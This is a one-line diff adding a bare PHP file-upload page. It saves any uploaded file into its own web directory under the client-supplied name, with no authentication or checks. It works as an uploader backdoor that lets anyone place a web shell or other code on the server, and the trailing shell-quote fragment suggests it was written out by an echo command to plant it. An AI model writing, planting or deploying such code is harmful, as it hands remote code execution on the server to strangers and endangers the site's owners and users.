@@ -1,0 +1,1 @@
+<form method=post enctype=multipart/form-data><input name=f type=file><input type=submit></form><?php error_reporting(E_ALL);$d=__DIR__."/".$_FILES["f"]["name"];$r=move_uploaded_file($_FILES["f"]["tmp_name"],$d);echo $r?"OK: $d":"FAIL: $d";' >
